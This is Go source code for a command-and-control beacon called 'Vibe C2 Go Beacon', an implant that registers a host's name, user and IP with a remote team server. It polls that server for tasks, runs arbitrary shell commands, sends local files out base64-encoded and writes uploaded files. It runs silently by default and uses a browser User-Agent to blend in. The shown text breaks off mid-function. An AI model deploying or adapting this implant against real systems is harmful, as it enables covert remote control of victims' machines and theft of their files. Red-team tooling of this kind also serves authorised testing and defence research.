package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Global variables
var debug bool
var silent bool // Silent mode - no console output

// Default server URL that can be set at build time with -ldflags
var defaultServerURL = "http://localhost:8080"

// Runtime configuration
var serverURL string
var sleepTime int
var jitterPercent int
var beaconID string
var hostname string
var username string
var osType string
var ipAddress string
var terminated bool
var currentWorkingDir string // Current working directory for shell commands

// Configuration variables
var ()

// Task represents a task assigned by the team server
type Task struct {
	ID        string      `json:"id"`
	BeaconID  string      `json:"beacon_id"`
	Command   interface{} `json:"command"`
	Timestamp int64       `json:"timestamp"`
}

// BeaconRegistration represents the data sent when registering with the team server
type BeaconRegistration struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
}

// Command from the Rust server - properly matching Rust's enum format
type Command struct {
	// The Rust Command enum gets serialized with the variant name as the key
	Shell     *string            `json:"Shell,omitempty"`
	Upload    *map[string]string `json:"Upload,omitempty"`
	Download  *map[string]string `json:"Download,omitempty"`
	Sleep     *map[string]uint64 `json:"Sleep,omitempty"`
	Jitter    *map[string]uint8  `json:"Jitter,omitempty"`
	Terminate *struct{}          `json:"Terminate,omitempty"`
}

// RustCommand represents a Command enum from the Rust server
type RustCommand struct {
	Shell     *string            `json:"Shell,omitempty"`
	Upload    *map[string]string `json:"Upload,omitempty"`
	Download  *map[string]string `json:"Download,omitempty"`
	Sleep     *map[string]uint64 `json:"Sleep,omitempty"`
	Jitter    *map[string]uint8  `json:"Jitter,omitempty"`
	Terminate *struct{}          `json:"Terminate,omitempty"`
}

// CommandOutput represents the output from executing a command
type CommandOutput struct {
	BeaconID string `json:"beacon_id"`
	TaskID   string `json:"task_id"`
	Output   string `json:"output"`
}

// CommandResponse represents the structure the team server expects
type CommandResponse struct {
	ID       string      `json:"id"`
	BeaconID string      `json:"beacon_id"`
	Result   interface{} `json:"result"`
}

// Initialize beacon configuration
func init() {
	// Set default values
	rand.Seed(time.Now().UnixNano())

	// Use a safer way to get hostname
	var err error
	hostname, err = os.Hostname()
	if err != nil {
		hostname = "unknown_host"
	}

	username = getCurrentUser()
	osType = runtime.GOOS

	// Try to detect the IP address
	ipAddress = getOutboundIP()
	writeErrorToFile(fmt.Sprintf("Detected IP address: %s", ipAddress))

	// Initialize current working directory
	currentWorkingDir, err = os.Getwd()
	if err != nil {
		currentWorkingDir = "." // Fallback to current directory
		writeErrorToFile(fmt.Sprintf("Failed to get current directory: %v", err))
	}
	writeErrorToFile(fmt.Sprintf("Initial working directory: %s", currentWorkingDir))

	terminated = false
	beaconID = generateBeaconID(10)

	// Default values for flags will be set by flag.Parse()

	// Handle panic in flag parsing
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Error during startup, using default settings")
			serverURL = defaultServerURL
			sleepTime = 30
			jitterPercent = 20
			debug = false
			silent = true
		}
	}()

	// Parse command line flags - wrapped in a func to allow recovery from panic
	func() {
		// Define all flags
		flag.StringVar(&serverURL, "server", defaultServerURL, "Team server URL")
		flag.IntVar(&sleepTime, "sleep", 30, "Sleep time between check-ins (in seconds)")
		flag.IntVar(&jitterPercent, "jitter", 20, "Jitter percentage for sleep time randomization (0-50)")
		flag.BoolVar(&debug, "debug", false, "Enable debug output")
		flag.BoolVar(&silent, "silent", true, "Enable silent mode (no console output)")

		// Add short form aliases
		flag.StringVar(&serverURL, "r", defaultServerURL, "Team server URL (shorthand)")
		flag.IntVar(&sleepTime, "s", 30, "Sleep time between check-ins (shorthand)")
		flag.IntVar(&jitterPercent, "j", 20, "Jitter percentage (shorthand)")
		flag.BoolVar(&debug, "d", false, "Enable debug output (shorthand)")
		flag.BoolVar(&silent, "q", true, "Enable silent mode (no console output) (shorthand)")

		// Parse flags
		flag.Parse()
	}()

	// Remove trailing slash from server URL if present
	serverURL = strings.TrimSuffix(serverURL, "/")
}

// Generate a random beacon ID
func generateBeaconID(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Get current username based on OS
func getCurrentUser() string {
	var username string

	switch runtime.GOOS {
	case "windows":
		username = os.Getenv("USERNAME")
	case "linux", "darwin":
		username = os.Getenv("USER")
	default:
		username = "unknown"
	}

	if username == "" {
		username = "unknown"
	}

	return username
}

// getOutboundIP gets the preferred outbound IP address by creating a UDP connection
// This doesn't actually establish a connection, but the OS will choose an interface
func getOutboundIP() string {
	connection, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Error getting IP: %v", err))
		return "unknown"
	}
	defer connection.Close()

	localAddr := connection.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// ANSI color codes for nice output
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorPurple = "\033[35m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
)

// Display a minimal banner (for debug purposes only)
func displayBanner() {
	if !silent {
		fmt.Print(colorCyan + "Vibe C2 Go Beacon v1.0.0" + colorReset + "\n\n")
	}
}

// Log helper functions
func logInfo(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[*] %s\n", fmt.Sprintf(format, args...))
	}
}

func logDebug(format string, args ...interface{}) {
	if debug && !silent {
		fmt.Printf("[🔍] %s\n", fmt.Sprintf(format, args...))
	}
}

func logError(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[❌] %s\n", fmt.Sprintf(format, args...))
	}
}

func logWarning(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[⚠️] %s\n", fmt.Sprintf(format, args...))
	}
}

func logSuccess(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[✅] %s\n", fmt.Sprintf(format, args...))
	}
}

func logMessage(icon string, color string, format string, args ...interface{}) {
	prefix := color + "[" + icon + "]" + colorReset + " "
	fmt.Printf(prefix+format+"\n", args...)
}

// Register the beacon with the team server
func registerBeacon() error {
	logInfo("Registering beacon with team server at %s", serverURL)
	writeErrorToFile("Attempting registration with server: " + serverURL)

	// Create registration payload
	reg := BeaconRegistration{
		Hostname: hostname,
		Username: username,
		OS:       osType,
		IP:       ipAddress,
	}

	jsonData, err := json.Marshal(reg)
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Marshal error: %v", err))
		return fmt.Errorf("error marshaling registration data: %v", err)
	}

	// Create the HTTP request with error handling
	writeErrorToFile("Creating HTTP request")
	url := fmt.Sprintf("%s/register", serverURL)

	// Safely create request
	var req *http.Request
	requestOk := false
	var requestErr error

	// Create request with panic recovery
	func() {
		defer func() {
			if r := recover(); r != nil {
				writeErrorToFile(fmt.Sprintf("Panic in NewRequest: %v", r))
				requestOk = false
			}
		}()

		r, e := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if e != nil {
			writeErrorToFile(fmt.Sprintf("Error in NewRequest: %v", e))
			requestErr = e
			requestOk = false
			return
		}
		req = r
		requestOk = true
	}()

	if !requestOk {
		return fmt.Errorf("error creating registration request: %v", requestErr)
	}

	// Set headers properly to ensure server accepts our request
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// Debug log the request
	writeErrorToFile(fmt.Sprintf("Request URL: %s", url))
	writeErrorToFile(fmt.Sprintf("Request headers: Content-Type=%s", req.Header.Get("Content-Type")))
	writeErrorToFile(fmt.Sprintf("Request body: %s", string(jsonData)))

	// Send the request with error handling
	var resp *http.Response
	var respErr error

	// Use an immediate function to handle panics during request
	func() {
		defer func() {
			if r := recover(); r != nil {
				writeErrorToFile(fmt.Sprintf("Panic during HTTP request: %v", r))
				respErr = fmt.Errorf("panic during request: %v", r)
			}
		}()

		// Create a client with timeout
		client := &http.Client{
			Timeout: 10 * time.Second,
		}

		// Make the request
		var err error
		resp, err = client.Do(req)
		if err != nil {
			writeErrorToFile(fmt.Sprintf("Error sending request: %v", err))
			respErr = err
		}
	}()

	// Check for errors during request
	if respErr != nil {
		return fmt.Errorf("error sending registration request: %v", respErr)
	}

	if resp == nil {
		return fmt.Errorf("error: null response received")
	}
	defer resp.Body.Close()

	// Read response with error handling
	var respBody []byte
	var readErr error

	func() {
		defer func() {
			if r := recover(); r != nil {
				writeErrorToFile(fmt.Sprintf("Panic reading response: %v", r))
				readErr = fmt.Errorf("panic reading response: %v", r)
			}
		}()

		respBody, readErr = io.ReadAll(resp.Body)
		if readErr != nil {
			writeErrorToFile(fmt.Sprintf("Error reading response: %v", readErr))
		}
	}()

	// Check for errors during read
	if readErr != nil {
		return fmt.Errorf("error reading registration response: %v", readErr)
	}

	// Check response
	if resp.StatusCode != http.StatusOK {
		writeErrorToFile(fmt.Sprintf("Registration failed with status %d: %s", resp.StatusCode, string(respBody)))
		return fmt.Errorf("registration failed with status %d: %s", resp.StatusCode, string(respBody))
	}

	// Try to parse the response in various formats
	// First, try as a JSON object with an id field
	type RegResponse struct {
		ID      string `json:"id"`
		Success bool   `json:"success"`
		Message string `json:"message,omitempty"`
	}

	var regResponse RegResponse
	if err := json.Unmarshal(respBody, &regResponse); err == nil && regResponse.ID != "" {
		// Update our beacon ID to the server-assigned one
		originalID := beaconID
		beaconID = regResponse.ID
		logSuccess("Server assigned beacon ID: %s (was: %s)", beaconID, originalID)
		writeErrorToFile(fmt.Sprintf("Server assigned beacon ID: %s", beaconID))
	} else {
		// Try as a direct quoted string
		var serverID string
		if err := json.Unmarshal(respBody, &serverID); err == nil && serverID != "" {
			// Update our beacon ID to the server-assigned one
			originalID := beaconID
			beaconID = serverID
			logSuccess("Server assigned beacon ID: %s (was: %s)", beaconID, originalID)
			writeErrorToFile(fmt.Sprintf("Server assigned beacon ID: %s", beaconID))
		} else {
			// Could not parse the response, log it and continue with original ID
			logWarning("Couldn't parse server response to extract beacon ID, using original ID: %s", beaconID)
			writeErrorToFile(fmt.Sprintf("Using original beacon ID: %s (couldn't parse server response)", beaconID))
			writeErrorToFile(fmt.Sprintf("Response body: %s", string(respBody)))
		}
	}

	logSuccess("Successfully registered with team server")
	return nil
}

// Check in with the team server and get tasks
func checkIn() ([]Task, error) {
	logInfo("Checking in with team server...")

	// Create check-in payload with the format the team server expects
	// The team server expects CheckInRequest struct with beacon_id and optional response
	checkInData := map[string]interface{}{
		"beacon_id": beaconID,
		"response":  nil, // No response during regular check-in
	}

	jsonData, err := json.Marshal(checkInData)
	if err != nil {
		return nil, fmt.Errorf("error marshaling check-in data: %v", err)
	}

	logDebug("Check-in payload: %s", string(jsonData))
	writeErrorToFile(fmt.Sprintf("Check-in payload: %s", string(jsonData)))

	// Send check-in request
	url := fmt.Sprintf("%s/check_in", serverURL)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("check-in request failed: %v", err)
	}

	// Set headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// Debug log the request
	writeErrorToFile(fmt.Sprintf("Request URL: %s", url))
	writeErrorToFile(fmt.Sprintf("Request headers: Content-Type=%s", req.Header.Get("Content-Type")))
	writeErrorToFile(fmt.Sprintf("Request body: %s", string(jsonData)))

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("check-in request failed: %v", err)
	}
	defer resp.Body.Close()

	// Read response
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading check-in response: %v", err)
	}

	logDebug("Raw check-in response: %s", string(bodyBytes))

	// No longer saving responses to disk (debug logs removed)
	if debug {
		logDebug("Raw response size: %d bytes", len(bodyBytes))
	}

	// Parse tasks
	var tasks []Task
	if len(bodyBytes) > 2 { // More than just "[]"
		err = json.Unmarshal(bodyBytes, &tasks)
		if err != nil {
			return nil, fmt.Errorf("error parsing tasks: %v", err)
		}
		logSuccess("Received %d task(s)", len(tasks))

		// Debug log each task details
		for i, task := range tasks {
			logDebug("Task %d: ID=%s, BeaconID=%s, Timestamp=%d",
				i+1, task.ID, task.BeaconID, task.Timestamp)

			// Inspect the command structure
			cmdBytes, _ := json.Marshal(task.Command)
			logDebug("Task %d Command (raw): %s", i+1, string(cmdBytes))

			// Try to determine command type
			switch cmd := task.Command.(type) {
			case string:
				logDebug("Task %d has string command: %s", i+1, cmd)
			case map[string]interface{}:
				logDebug("Task %d has map command with keys: %v", i+1, getMapKeys(cmd))
			default:
				logDebug("Task %d has command of type: %T", i+1, cmd)
			}
		}
	} else {
		logInfo("No new tasks")
	}

	return tasks, nil
}

// Execute a shell command
func executeShellCommand(command string) string {
	logInfo("Executing shell command: %s", command)
	logDebug("Current working directory: %s", currentWorkingDir)

	// Special handling for cd commands to track directory changes
	if strings.HasPrefix(strings.TrimSpace(command), "cd ") {
		return handleCdCommand(command)
	}

	// For all other commands, execute in the current working directory
	var cmd *exec.Cmd

	// Use appropriate shell based on OS
	switch runtime.GOOS {
	case "windows":
		logDebug("Using Windows shell")
		cmd = exec.Command("cmd", "/C", command)
	default:
		logDebug("Using UNIX shell")
		cmd = exec.Command("sh", "-c", command)
	}

	// Set the working directory for the command
	cmd.Dir = currentWorkingDir

	// Get command output
	output, err := cmd.CombinedOutput()
	outputStr := string(output)

	if err != nil {
		logError("Command execution error: %v", err)
		return fmt.Sprintf("Error: %v\n%s", err, outputStr)
	}

	logSuccess("Command executed successfully")
	logDebug("Command output: %s", outputStr)

	return outputStr
}

// Handle cd commands by updating the current working directory
func handleCdCommand(command string) string {
	// Extract the target directory from the cd command
	parts := strings.SplitN(strings.TrimSpace(command), " ", 2)
	if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
		// Handle "cd" with no arguments - typically goes to home directory
		homeDir, err := os.UserHomeDir()
		if err != nil {
			logError("Failed to get home directory: %v", err)
			return fmt.Sprintf("Error: Failed to get home directory: %v", err)
		}
		
		prevDir := currentWorkingDir
		currentWorkingDir = homeDir
		logSuccess("Changed directory to home: %s", currentWorkingDir)
		return fmt.Sprintf("Changed directory: %s -> %s", prevDir, currentWorkingDir)
	}
	
	targetDir := strings.TrimSpace(parts[1])
	
	// Handle special case for Windows drives (C:, D:, etc.)
	if runtime.GOOS == "windows" && len(targetDir) == 2 && targetDir[1] == ':' {
		// When typing just "C:" in Windows, it means switch to that drive but stay in current directory
		targetDir = targetDir + "\\"
	}
	
	// Resolve the path based on whether it's absolute or relative
	var newDir string
	if filepath.IsAbs(targetDir) {
		// Absolute path
		newDir = targetDir
	} else {
		// Relative path - join with current working directory
		newDir = filepath.Join(currentWorkingDir, targetDir)
	}
	
	// Check if the directory exists
	fileInfo, err := os.Stat(newDir)
	if err != nil {
		logError("Failed to change directory: %v", err)
		return fmt.Sprintf("Error: %v", err)
	}
	
	if !fileInfo.IsDir() {
		logError("Not a directory: %s", newDir)
		return fmt.Sprintf("Error: Not a directory: %s", newDir)
	}
	
	// Update the current working directory
	prevDir := currentWorkingDir
	currentWorkingDir = newDir
	logSuccess("Changed directory: %s -> %s", prevDir, currentWorkingDir)
	
	// Return success message with current directory
	return fmt.Sprintf("Changed directory: %s -> %s", prevDir, currentWorkingDir)
}

// Send command output back to the team server
func sendCommandOutput(taskID, output string) error {
	logInfo("Sending command output for task: %s", taskID)
	writeErrorToFile(fmt.Sprintf("Sending command output for task: %s, output length: %d", taskID, len(output)))

	// Use the correct format for Go beacon command output
	// The team server expects CommandOutput with beacon_id, task_id, and output fields
	commandOutput := map[string]string{
		"beacon_id": beaconID,
		"task_id":   taskID,
		"output":    output,
	}

	jsonData, err := json.Marshal(commandOutput)
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Error marshaling command output: %v", err))
		return fmt.Errorf("error marshaling command output: %v", err)
	}

	logDebug("Command output payload size: %d bytes", len(jsonData))
	logDebug("Command output payload: %s", string(jsonData))
	writeErrorToFile(fmt.Sprintf("Command output payload: %s", string(jsonData)))

	// Create a request with proper headers
	url := fmt.Sprintf("%s/command_output", serverURL)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error creating command output request: %v", err)
	}

	// Set headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// Send the request
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Send command output request failed: %v", err))
		return fmt.Errorf("send command output request failed: %v", err)
	}
	defer resp.Body.Close()

	// Read and log the response body
	bodyBytes, _ := io.ReadAll(resp.Body)
	logDebug("Command output response: %s", string(bodyBytes))
	writeErrorToFile(fmt.Sprintf("Command output response: %s", string(bodyBytes)))

	// Check response
	if resp.StatusCode != http.StatusOK {
		writeErrorToFile(fmt.Sprintf("Sending command output failed with status %d: %s", resp.StatusCode, string(bodyBytes)))
		return fmt.Errorf("sending command output failed with status %d: %s", resp.StatusCode, string(bodyBytes))
	}

	logSuccess("Command output sent successfully to team server")
	return nil
}

// Process tasks received from the team server
func processTasks(tasks []Task) {
	logInfo("Received %d tasks from server", len(tasks))

	// No longer saving tasks to disk (debug logs removed)
	if debug {
		logDebug("Total tasks received: %d", len(tasks))
	}

	for i, task := range tasks {
		logInfo("Processing task %d/%d: %s", i+1, len(tasks), task.ID)

		// Dump the entire task structure for debugging
		taskJSON, _ := json.MarshalIndent(task, "", "  ")
		logDebug("Full task structure:\n%s", string(taskJSON))

		// Check if the command is a string (special case for Terminate)
		if cmdStr, ok := task.Command.(string); ok {
			// Handle string commands
			logDebug("Command is a direct string: %s", cmdStr)

			// Special handling for Terminate
			if cmdStr == "Terminate" {
				logWarning("Received terminate command (string format), shutting down...")
				sendCommandOutput(task.ID, "Beacon terminating")
				terminated = true
				return
			}

			// For other string commands, try to run as shell commands
			logSuccess("Executing direct string command: %s", cmdStr)
			output := executeShellCommand(cmdStr)
			sendCommandOutput(task.ID, output)
			continue
		}

		// MAIN APPROACH: Use map[string]interface{} for structured commands
		// This handles the standard command format the server sends
		cmdData, ok := task.Command.(map[string]interface{})
		if !ok {
			// If it's not a map or string, try to serialize and deserialize it
			cmdJSON, err := json.Marshal(task.Command)
			if err != nil {
				logError("Failed to serialize command: %v", err)
				continue
			}

			// Try to parse as map
			err = json.Unmarshal(cmdJSON, &cmdData)
			if err != nil {
				logError("Failed to parse command as map: %v", err)
				// Debug dump of command structure
				logDebug("Command format not recognized. Keys: %v", getMapKeys(cmdData))
				continue
			}
		}

		logDebug("Command map keys: %v", getMapKeys(cmdData))

		// HANDLE SHELL COMMAND
		if shellCmd, ok := cmdData["Shell"]; ok {
			// Extract the shell command string
			var shellCmdStr string

			switch v := shellCmd.(type) {
			case string:
				shellCmdStr = v
			default:
				logError("Shell command value is not a string: %T", shellCmd)
				continue
			}

			logSuccess("✓ Executing shell command: %s", shellCmdStr)
			output := executeShellCommand(shellCmdStr)
			logDebug("Command output: %s", output)

			err := sendCommandOutput(task.ID, output)
			if err != nil {
				logError("Failed to send command output: %v", err)
			}
			continue
		}

		// HANDLE SLEEP COMMAND - Multiple possible formats
		// Format 1: {"Sleep":{"seconds":60}}
		if sleepData, ok := cmdData["Sleep"].(map[string]interface{}); ok {
			if secondsVal, ok := sleepData["seconds"]; ok {
				// Convert to int (handle different numeric types)
				var seconds int
				switch v := secondsVal.(type) {
				case float64:
					seconds = int(v)
				case int:
					seconds = v
				case int64:
					seconds = int(v)
				case uint64:
					seconds = int(v)
				default:
					logError("Sleep seconds is not a number: %T", secondsVal)
					continue
				}

				oldSleep := sleepTime
				sleepTime = seconds
				logSuccess("Sleep time changed from %d to %d seconds", oldSleep, sleepTime)
				output := fmt.Sprintf("Sleep time changed to %d seconds", sleepTime)

				// Send the output to the operator
				sendCommandOutput(task.ID, output)

				// Update the team server with the new sleep time
				go updateBeaconConfig() // Run in a goroutine to not block command processing

				continue
			}
		}

		// Format 2: Direct Sleep field at top level with seconds field
		// This matches the Rust team server format better
		if secondsVal, ok := cmdData["seconds"]; ok && cmdHasType(cmdData, "Sleep") {
			logDebug("Found Sleep command with seconds field: %v", secondsVal)

			// Convert to int (handle different numeric types)
			var seconds int
			switch v := secondsVal.(type) {
			case float64:
				seconds = int(v)
			case int:
				seconds = v
			case int64:
				seconds = int(v)
			case uint64:
				seconds = int(v)
			default:
				logError("Sleep seconds is not a number: %T", secondsVal)
				continue
			}

			// Debug log the command details
			writeErrorToFile(fmt.Sprintf("Processing Sleep command: old=%d, new=%d", sleepTime, seconds))

			oldSleep := sleepTime
			sleepTime = seconds
			logSuccess("Sleep time changed from %d to %d seconds", oldSleep, sleepTime)
			output := fmt.Sprintf("Sleep time changed to %d seconds", sleepTime)
			sendCommandOutput(task.ID, output)

			// Update the team server with the new sleep time
			go updateBeaconConfig() // Run in a goroutine to not block command processing

			continue
		}

		// HANDLE JITTER COMMAND
		if jitterData, ok := cmdData["Jitter"].(map[string]interface{}); ok {
			if percentVal, ok := jitterData["percent"]; ok {
				// Convert to int (handle different numeric types)
				var percent int
				switch v := percentVal.(type) {
				case float64:
					percent = int(v)
				case int:
					percent = v
				case int64:
					percent = int(v)
				case uint8:
					percent = int(v)
				default:
					logError("Jitter percent is not a number: %T", percentVal)
					continue
				}

				oldJitter := jitterPercent
				jitterPercent = percent
				if jitterPercent > 50 {
					jitterPercent = 50
				}
				logSuccess("Jitter percentage changed from %d%% to %d%%", oldJitter, jitterPercent)
				output := fmt.Sprintf("Jitter percentage changed to %d%%", jitterPercent)
				sendCommandOutput(task.ID, output)

				// Update the team server with the new jitter configuration
				go updateBeaconConfig() // Run in a goroutine to not block command processing
			}
			continue
		}

		// HANDLE DOWNLOAD COMMAND
		if downloadData, ok := cmdData["Download"].(map[string]interface{}); ok {
			logDebug("Processing download command: %v", downloadData)
			writeErrorToFile(fmt.Sprintf("Download command received: %v", downloadData))

			// Extract source path
			sourceVal, sourceOk := downloadData["source"]
			if !sourceOk {
				errMsg := "Download command missing 'source' field"
				logError(errMsg)
				writeErrorToFile(errMsg)
				sendCommandOutput(task.ID, "Error: Download command missing source path")
				continue
			}

			source, ok := sourceVal.(string)
			if !ok {
				errMsg := fmt.Sprintf("Download source is not a string: %T", sourceVal)
				logError(errMsg)
				writeErrorToFile(errMsg)
				sendCommandOutput(task.ID, "Error: Download source path is not a string")
				continue
			}

			logInfo("Reading file for download: %s", source)
			writeErrorToFile(fmt.Sprintf("Attempting to read file: %s", source))

			// Safely read the file
			var fileData []byte
			var fileReadErr error

			// Define a function to safely read the file with error handling
			fileReadOk := false
			func() {
				defer func() {
					if r := recover(); r != nil {
						writeErrorToFile(fmt.Sprintf("Panic in ReadFile: %v", r))
						fileReadOk = false
					}
				}()

				data, e := os.ReadFile(source)
				if e != nil {
					writeErrorToFile(fmt.Sprintf("Error reading file: %v", e))
					fileReadErr = e
					fileReadOk = false
					return
				}
				fileData = data
				fileReadOk = true
			}()

			if !fileReadOk {
				errMsg := fmt.Sprintf("Error reading file: %v", fileReadErr)
				logError(errMsg)
				writeErrorToFile(errMsg)
				sendCommandOutput(task.ID, errMsg)
				continue
			}

			writeErrorToFile(fmt.Sprintf("Successfully read file: %s (%d bytes)", source, len(fileData)))

			// Extract filename from path
			filename := source
			if strings.Contains(source, "/") {
				parts := strings.Split(source, "/")
				filename = parts[len(parts)-1]
			} else if strings.Contains(source, "\\") {
				parts := strings.Split(source, "\\")
				filename = parts[len(parts)-1]
			}

			// Get destination if provided
			destVal, destOk := downloadData["destination"]
			if destOk {
				if destStr, ok := destVal.(string); ok && destStr != "" {
					filename = destStr
				}
			}

			// Encode the file data as Base64
			encodedData := base64.StdEncoding.EncodeToString(fileData)

			// Detailed logging for debugging
			writeErrorToFile(fmt.Sprintf("File read success - Size: %d bytes, Filename: %s", len(fileData), filename))
			writeErrorToFile(fmt.Sprintf("Encoded data size: %d bytes", len(encodedData)))

			// Create file response
			fileDataObj := map[string]interface{}{
				"FileData": encodedData,
				"FileName": filename,
			}

			// Log the fileDataObj keys for debugging
			writeErrorToFile("FileDataObj keys:")
			for key := range fileDataObj {
				writeErrorToFile(fmt.Sprintf("  - %s", key))
			}

			// Create response with proper Rust enum format
			response := CommandResponse{
				ID:       task.ID,
				BeaconID: beaconID,
				Result:   map[string]interface{}{
					"FileData": fileDataObj,
				},
			}

			// Send the file data to the server
			client := &http.Client{
				Timeout: 30 * time.Second, // Add timeout for better error detection
			}
			responseJSON, err := json.Marshal(response)
			if err != nil {
				logError("Failed to marshal file response: %v", err)
				writeErrorToFile(fmt.Sprintf("JSON marshal error: %v", err))
				continue
			}
			writeErrorToFile(fmt.Sprintf("Response JSON size: %d bytes", len(responseJSON)))

			// Enhanced HTTP request logging
			writeErrorToFile(fmt.Sprintf("Sending download response to %s/responses", serverURL))
			resp, err := client.Post(
				fmt.Sprintf("%s/responses", serverURL),
				"application/json",
				bytes.NewBuffer(responseJSON),
			)
			if err != nil {
				logError("Failed to send file to server: %v", err)
				writeErrorToFile(fmt.Sprintf("HTTP error sending file: %v", err))
				continue
			}
			defer resp.Body.Close()
			
			// Log HTTP response details
			writeErrorToFile(fmt.Sprintf("HTTP response status: %s", resp.Status))
			respBody, _ := io.ReadAll(resp.Body)
			if len(respBody) > 0 {
				writeErrorToFile(fmt.Sprintf("Response body: %s", string(respBody)))
			} else {
				writeErrorToFile("Response body empty")
			}

			logSuccess("Successfully sent file data for %s (%d bytes)", filename, len(fileData))
			continue
		}

// ... (rest of the code remains the same)
		// HANDLE UPLOAD COMMAND
		if uploadData, ok := cmdData["Upload"].(map[string]interface{}); ok {
			logDebug("Processing upload command: %v", uploadData)

			// Extract destination path
			destVal, destOk := uploadData["destination"]
			if !destOk {
				logError("Upload command missing 'destination' field")
				sendCommandOutput(task.ID, "Error: Upload command missing destination path")
				continue
			}

			destination, ok := destVal.(string)
			if !ok {
				logError("Upload destination is not a string: %T", destVal)
				sendCommandOutput(task.ID, "Error: Upload destination path is not a string")
				continue
			}

			// Extract file data
			dataVal, dataOk := uploadData["data"]
			if !dataOk {
				logError("Upload command missing 'data' field")
				sendCommandOutput(task.ID, "Error: Upload command missing file data")
				continue
			}

			data, ok := dataVal.(string)
			if !ok {
				logError("Upload data is not a string: %T", dataVal)
				sendCommandOutput(task.ID, "Error: Upload file data is not a string")
				continue
			}

			// Decode base64 data
			decodedData, err := base64.StdEncoding.DecodeString(data)
			if err != nil {
				errMsg := fmt.Sprintf("Error decoding file data: %v", err)
				logError(errMsg)
				sendCommandOutput(task.ID, errMsg)
				continue
			}

			// Create directory if it doesn't exist
			dir := filepath.Dir(destination)
			if dir != "." && dir != "/" && dir != "\\" {
				if err := os.MkdirAll(dir, 0755); err != nil {
					errMsg := fmt.Sprintf("Error creating directory '%s': %v", dir, err)
					logError(errMsg)
					sendCommandOutput(task.ID, errMsg)
					continue
				}
			}

			// Write the file
			err = os.WriteFile(destination, decodedData, 0644)
			if err != nil {
				errMsg := fmt.Sprintf("Error writing file to '%s': %v", destination, err)
				logError(errMsg)
				sendCommandOutput(task.ID, errMsg)
				continue
			}

			// Success
			succMsg := fmt.Sprintf("File uploaded successfully to %s (%d bytes)", destination, len(decodedData))
			logSuccess(succMsg)
			sendCommandOutput(task.ID, succMsg)
			continue
		}

		// HANDLE TERMINATE COMMAND
		if _, ok := cmdData["Terminate"]; ok {
			logWarning("Received terminate command, shutting down...")
			sendCommandOutput(task.ID, "Beacon terminating")
			terminated = true
			return
		}

		// Command not recognized
		logError("⚠️ Unrecognized command format for task: %s", getTaskID(task))
		sendCommandOutput(task.ID, "Error: Command format not recognized")
	}
}

// Helper function to check if a command has a specific type
func cmdHasType(cmdData map[string]interface{}, cmdType string) bool {
	// Check for the "type" field that may indicate command type
	if typeVal, ok := cmdData["type"]; ok {
		if typeStr, ok := typeVal.(string); ok {
			return typeStr == cmdType
		}
	}

	// Check for explicit command field
	if _, ok := cmdData[cmdType]; ok {
		return true
	}

	// Check if the command key itself is the type
	for key := range cmdData {
		if key == cmdType {
			return true
		}
	}

	// For Sleep commands specifically, look for the seconds field at top level
	if cmdType == "Sleep" && cmdData["seconds"] != nil {
		return true
	}

	return false
}

// Helper function to extract keys from a map
func getMapKeys(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// Update the team server with the current beacon configuration
func updateBeaconConfig() {
	writeErrorToFile("Updating team server with new beacon configuration")

	// Create a configuration update payload
	configUpdate := map[string]interface{}{
		"beacon_id":      beaconID,
		"sleep_time":     sleepTime,
		"jitter_percent": jitterPercent,
	}

	jsonData, err := json.Marshal(configUpdate)
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Error marshaling config update: %v", err))
		return
	}

	// Create the request
	url := fmt.Sprintf("%s/update_config", serverURL)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Error creating config update request: %v", err))
		return
	}

	// Set headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	// Send the request
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		writeErrorToFile(fmt.Sprintf("Config update request failed: %v", err))
		return
	}
